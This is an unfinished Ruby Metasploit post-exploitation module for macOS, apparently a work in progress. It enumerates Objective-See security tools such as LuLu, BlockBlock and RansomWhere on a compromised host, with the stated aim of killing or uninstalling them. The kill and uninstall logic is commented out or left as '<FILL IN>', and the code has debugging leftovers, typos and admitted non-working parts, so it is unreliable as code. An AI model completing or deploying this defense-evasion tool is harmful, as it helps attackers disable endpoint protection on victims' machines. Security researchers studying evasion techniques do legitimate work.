##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::OSX
  include Msf::Post::Process
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Objective See Killer' => 'OSX Manage Module: Enumerate and disable Objective See products',
        'Description' => %q{
          This module enumerates the system for the presence of Objective See products such as LuLu, BlockBlock, Do Not Disturb,
          Rei Key, Ransom Where and Over Sight. If the disable option is set each product will be sent a kill
          signal to the pid associated with the application. Removing the product entirely from the system is
          also an option, removal occurs by <FILL IN>. Killing
          the pid and removing the product both require sudo privlleges.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'gardnerapp' ],
        'Platform' => [ 'osx' ],
        'SessionTypes' => 'meterpreter', # ˇTODO test on non-meterpreter sessions
        'URL' => [
          'https://objective-see.org/tools.html'
        ]
      )

  )
    register_options(
      [
        OptBool.new('ENUMERATE_ONLY', [true, 'When set to true this module will only enumerate the system for Objective See products without disabling them. ']),
        OptBool.new('KILL_PROCESSES', [true, 'When enabled all PID\'s associated with the installed Objective See products will be sent a kill signal. ', false]),
        OptBool.new('UNINSTALL', [true, 'When enabled all of the Objective See products weill be uninstalled from the system.']),
      ]
    )
  end

  # Holds information on an objective see product. i.e name, installation status and location on filesystem.
  class ObjectiveSee

    attr_accessor :name, :path

    # is cattr_accessor only in rails?
    cattr_accessor :installed_products
    cattr_accessor :pids

    @@installed_products = []

    def initialize(name, msf)

      # so we can use the Metasploit API to interact with the session object
      @msf = msf
      @name = name 
      p (name)
      # writing name this way is prettier and makes it easier to grab pid's of running processes
      # no idea why this code is not running
      # @name = name.delete_suffix!("Helper").delete_suffix!(".app")

      @path = "/Applications/#{name}"
      @installed = installed?

      # @@present is a class variable which stores all of products installed on the system
      # ObjectiveSee.installed_products => [<ObjectiveSee>,<ObjectiveSee>]
      @@installed_products << self if installed?
    end

    def installed?
      @installed = @msf.send :directory?, @path
    end

    # Needs to be refactored.
    def pid
      @pid = @msf.send :pidof, @name
    end

    def running?
      true unless @pid.nil?
    end
  end

  # Determine which products are installed and their ppid if any
  # Two BlockBlock processes are running BlockBlock Helper.app and BlockBlock.app
  def enumerate
    products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app',
    'ReiKey.app', 'RansomWhere.app', 'OverSight.app'].map do |prod|
    ObjectiveSee.new prod, self
    end
  end

  def run
    print_status('Enumerating Objective See security products.')
    enumerate

    if ObjectiveSee.installed_products.empty?
      fail_with(Failure::NotFound,
                'No Objective Cee products were found to be installed on the system.')
    else
      print_good('The following Objective See products were found installed on the system:')
      ObjectiveSee.installed_products.each { |prod| print_status(prod.name)}
    end

    x = ObjectiveSee.installed_products.map {|p| p.name}

    print_status x

  # get_processes returns an array pf hashes, composed of the name of the program and the pid
  # ex. [{"name"=>"configd", "pid"=>116},
  # {"name"=>"logd", "pid"=>104},
  # {"name"=>"UserEventAgent", "pid"=>106},
  # {"name"=>"launchd", "pid"=>1}]

   # get_processes.select do |elem|
   #   elem['name'].include? 'BlockBlock'
   # end 

   # grep for installed products names


    return if datastore['ENUMERATE_ONLY']

    # ObjectiveSee.installed_products.each {|prod| &:kill_pid} if datastore['KILL_PROCESSES']

    # uninstall if datastore['']
  end
end
